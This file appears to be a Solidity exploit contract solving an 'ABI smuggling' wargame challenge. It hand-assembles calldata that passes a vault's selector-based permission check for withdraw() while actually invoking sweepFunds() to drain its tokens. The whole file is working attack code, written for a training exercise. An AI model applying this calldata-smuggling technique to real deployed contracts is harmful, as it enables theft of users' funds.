// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.25;

import {SelfAuthorizedVault} from "src/abi-smuggling/SelfAuthorizedVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

//lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    //Event declarations for loggin
    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes dataOffset);
    event LogEmptyData(bytes emptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
    event LogCalldataPayload(bytes calldataPayload);

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns(bytes memory){
        require(msg.sender == player, "only player can execute exploit");

        //This is the function selector for execute
        bytes4 executeSelector = vault.execute.selector;

        //Construct the target contract address, which is the vault address, padded to 32 bytes
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        //Construct the calldata start location offset 
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); //Offset for the start of the action

        //Construct the empty data filler (32 bytes of zeros)
        bytes memory emptyData = abi.encodePacked(uint256(0));

        //Manually define the `withdraw()`function selector as `d9card12`followed by zeroes 
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12), //Withdraw function selector
            bytes28(0) //28 zero bytes to fill the 32-byte slot
        );

        // Construct the calldata for the `sweepFunds()` function
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Manually set actionDataLength to 0x44 (68bytes)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthValue);
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        //Combine all parts to create the complete calldata payload
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector, //4bytes
            target, //32bytes
            dataOffset, //32bytes
            emptyData, //32bytes
            withdrawSelectorPadded, //32bytes
            actionDataLength, //Length of actionData
            sweepFundsCalldata //The actual call data to `sweepFunds()`
        );

        //emit the calldata payload for debugging
        emit LogCalldataPayload(calldataPayload);

        // return the constructed calldata payload
        return calldataPayload;

    }
}